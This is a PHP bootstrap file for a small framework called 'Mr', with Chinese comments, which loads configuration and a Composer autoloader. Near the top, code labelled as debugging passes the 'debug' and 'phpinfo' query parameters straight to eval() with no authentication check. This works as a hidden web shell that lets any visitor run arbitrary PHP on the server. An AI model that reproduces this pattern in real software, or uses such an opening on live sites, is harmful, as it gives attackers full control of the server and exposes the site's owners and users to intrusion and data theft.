<?php
/* 常量 */
define('MR_PATH', __DIR__);

/* 全局变量 */
$_DEBUG = [
	'code' => null,
	'end' => null,
	'phpinfo' => null,
];

/* 全局对象 */
$Mr = null;



#  persevere()
/* 前置调试 */
if (isset($_GET['debug'])) {
	// 错误报告
	ini_set('display_errors', 1);
	ini_set('display_startup_errors', 1);
	error_reporting(E_ALL);
	
	$_DEBUG['code'] = $_GET['debug'];
	// 开始调试问题
	if (is_array($_DEBUG['code'])) {
		if (isset($_DEBUG['code'][0]) && $_DEBUG['code'][0]) {
			eval($_DEBUG['code'][0]);
		}
		if (isset($_DEBUG['code'][1])) {
			$_DEBUG['end'] = $_DEBUG['code'][1];
		}
	}
}


// PHP 配置的信息
if (isset($_GET['phpinfo']) || (isset($_SERVER['PATH_INFO']) && '/phpinfo' == $_SERVER['PATH_INFO']) ) {
	$_DEBUG['phpinfo'] = $_GET['phpinfo'] ? : -1;
	if (is_string($_DEBUG['phpinfo'])) {
		eval("\$_DEBUG['phpinfo'] = {$_DEBUG['phpinfo']};");
	}
	phpinfo($_DEBUG['phpinfo']);
	
	if (isset($_DEBUG['code'][2])) {
		// 中间调试问题
		if ($_DEBUG['code'][2]) {
			eval($_DEBUG['code'][2]);
		} else {
			exit;
		}
	}
}

class Mr
{
	public static function php($off = null)
	{
		global $_DEBUG;
		# print_r(__METHOD__);
		\Composer\Autoload\includeFile(APP_PATH . '/../app/config.php');
		\Mr\Kernel::on();
		if ($off) {
			\Mr\Kernel::off();
		}
		include_once MR_PATH . '/timeline.php';
	}
}

$Composer = require APP_PATH . '/../vendor/autoload.php';
